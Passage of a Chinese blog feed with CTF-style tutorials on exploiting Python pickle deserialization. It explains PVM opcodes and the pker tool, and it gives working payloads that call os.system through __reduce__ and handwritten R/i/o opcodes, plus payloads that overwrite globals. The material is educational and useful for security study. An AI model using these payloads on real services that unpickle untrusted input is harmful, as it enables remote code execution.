注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）<br></code></pre></td></tr></table></figure><p>注意：</p><ol><li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li><li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-built_in">return</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>被解析为：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">b<span class="hljs-string">&quot;S&#x27;123&#x27;<span class="hljs-subst">\n</span>p0<span class="hljs-subst">\n</span>0g0<span class="hljs-subst">\n</span>.&quot;</span><br></code></pre></td></tr></table></figure><h4 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h4><ul><li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>覆盖引入模块的变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><p>接下来会给出一些具体的基本操作的实例。</p><h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul><li>通过<code>b&#39;R&#39;</code>调用：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`调用<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;i&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>多参数调用函数</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure><h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul><li>实例化对象是一种特殊的函数执行</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># 或者</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>其中，python原文件中包含：</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure><ul><li>也可以先实例化再赋值：</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul><li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li><li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li></ul><p>参考： <a href="https://xz.aliyun.com/news/6608">https://xz.aliyun.com/news/6608</a> </p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>opcode</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickle反序列化</title>
    <link href="/tuyi/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/tuyi/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是pickle"><a href="#什么是pickle" class="headerlink" title="什么是pickle"></a>什么是pickle</h1><ul><li><p>pickle实际上是一门栈语言</p></li><li><p>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包</p></li><li><p>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</p></li><li><p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p></li></ul><h2 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h2><ul><li><code>None</code> 、 <code>True</code> 和 <code>False</code></li><li>整数、浮点数、复数</li><li>str、byte、bytearray</li><li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li><li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li><li>定义在模块最外层的内置函数</li><li>定义在模块最外层的类</li><li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li></ul><h2 id="object-reduce-函数"><a href="#object-reduce-函数" class="headerlink" title="object.__reduce__() 函数"></a><code>object.__reduce__()</code> 函数</h2><ul><li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li><li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的。</li></ul><h1 id="pickle过程详细解读"><a href="#pickle过程详细解读" class="headerlink" title="pickle过程详细解读"></a>pickle过程详细解读</h1><ul><li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li><li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：</li><li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li><li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li><li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li><li>PVM解析 <code>str</code> 的过程动图：</li></ul><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230631-6204866e-6abc-1.gif" alt="img"></p><ul><li><p>PVM解析 <code>__reduce__()</code> 的过程动图：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p></li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>pickle EXP的简单demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        s = <span class="hljs-string">&quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;</span>  <span class="hljs-comment"># 要执行的命令</span><br>        <span class="hljs-keyword">return</span> os.system, (s,)        <span class="hljs-comment"># reduce函数必须返回元组或字符串</span><br><br>e = genpoc()<br>poc = pickle.dumps(e)<br><br><span class="hljs-built_in">print</span>(poc) <span class="hljs-comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span><br></code></pre></td></tr></table></figure><p>变量覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br>key1 = <span class="hljs-string">b&#x27;321&#x27;</span><br>key2 = <span class="hljs-string">b&#x27;123&#x27;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))<br><br>a = A()<br>pickle_a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(pickle_a)<br>pickle.loads(pickle_a)<br><span class="hljs-built_in">print</span>(key1, key2) <span class="hljs-comment">#覆盖</span><br></code></pre></td></tr></table></figure><h1 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h1><ul><li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li><li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li><li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode</li></ul><h2 id="常用opcode解析"><a href="#常用opcode解析" class="headerlink" title="常用opcode解析"></a>常用opcode解析</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p><p>常用的opcode如下：完整的可在<code>$PYTHON/Lib/pickle.py</code>查看</p><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th><th>memo上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td><td>无</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td><td>无</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td><td>无</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td><td>无</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td><td>无</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td><td>对象被储存</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td><td>无</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td><td>无</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td><td>无</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td><td>无</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td><td>无</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td><td>无</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td><td>无</td></tr></tbody></table><p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b&#39;I01\n&#39;</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b&#39;I00\n&#39;</code> ，其他opcode可以在<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。</p><p>用这些opcode我们可以得到一些需要注意的地方：</p><ul><li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li><li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li><li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li><li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li><li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li></ul><h4 id="拼接opcode"><a href="#拼接opcode" class="headerlink" title="拼接opcode"></a>拼接opcode</h4><p>将第一个pickle流结尾表示结束的 <code>.</code> 去掉，将第二个pickle流与第一个拼接起来即可。</p><h4 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h4><p>python源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># secret.py</span><br>name=<span class="hljs-string">&#x27;TEST3213qkfsmfo&#x27;</span><br><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> secret<br><br>opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>,secret.name)<br><br>output=pickle.loads(opcode.encode())<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output:&#x27;</span>,output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,secret.name)<br></code></pre></td></tr></table></figure><p>这段字节码的含义是：</p><ol><li><code>c__main__\nsecret\n</code>：<ul><li>从 <code>__main__</code> 模块中获取 <code>secret</code> 对象。</li></ul></li><li><code>(S&#39;name&#39;\nS&#39;1&#39;\ndb.</code>：<ul><li>创建一个字典 <code>&#123;&#39;name&#39;: &#39;1&#39;&#125;</code>，并将其赋值给 <code>secret</code> 对象的 <code>__dict__</code> 属性。</li></ul></li></ol><p>使用到的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h4><p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：</p><ol><li><code>R</code> ：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">cos：</span><br><span class="hljs-string">从 os 模块中获取 system 函数。</span><br><span class="hljs-string">system：</span><br><span class="hljs-string">调用 os.system 函数。</span><br><span class="hljs-string">(S&#x27;whoami&#x27;：</span><br><span class="hljs-string">将字符串 &#x27;whoami&#x27; 作为参数传递给 os.system。</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>i</code> ：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br>(S<span class="hljs-string">&#x27;whoami&#x27;</span>\nios\nsystem\n.：<br>S<span class="hljs-string">&#x27;whoami&#x27;</span>：表明这是一个字符串，值为 <span class="hljs-string">&#x27;whoami&#x27;</span>。<br>ios 和 system：指向 Python 模块 os 的 system 方法。<br>.：表示序列化结束<br></code></pre></td></tr></table></figure><ol start="3"><li><code>o</code> ：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br>(cos\nsystem\nS<span class="hljs-string">&#x27;whoami&#x27;</span>\no.：<br>c：表示引用一个模块。<br>os：表示导入的模块是 Python 的标准库 os。<br>system：引用了 os 模块中的 system 方法。<br>S<span class="hljs-string">&#x27;whoami&#x27;</span>：序列化的字符串，内容为 <span class="hljs-string">&#x27;whoami&#x27;</span>。<br>o：表示调用（对象应用），将字符串作为参数传递给 os.system 方法。<br>.：表示序列化结束。<br></code></pre></td></tr></table></figure><h4 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h4><p>实例化对象是一种特殊的函数执行，这里简单的使用 <code>R</code> 构造一下，其他方式类似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = age<br><br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">Student</span><br><span class="hljs-string">(S&#x27;XiaoMing&#x27;</span><br><span class="hljs-string">S&quot;20&quot;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>a=pickle.loads(data)<br><span class="hljs-built_in">print</span>(a.name,a.age)<br><span class="hljs-comment">#创建了student对象</span><br></code></pre></td></tr></table></figure><h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pker下载源码。</a></li><li>使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。</li><li>再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li></ul><h2 id="pker能做的事"><a href="#pker能做的事" class="headerlink" title="pker能做的事"></a>pker能做的事</h2><blockquote><ul><li>变量赋值：存到memo中，保存memo下标和变量名即可</li><li>函数调用</li><li>类型字面量构造</li><li>list和dict成员修改</li><li>对象成员变量修改</li></ul></blockquote><p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p><h2 id="使用方法与示例"><a href="#使用方法与示例" class="headerlink" title="使用方法与示例"></a>使用方法与示例</h2><ol><li>pker中的针对pickle的特殊语法需要重点掌握</li><li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li><li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 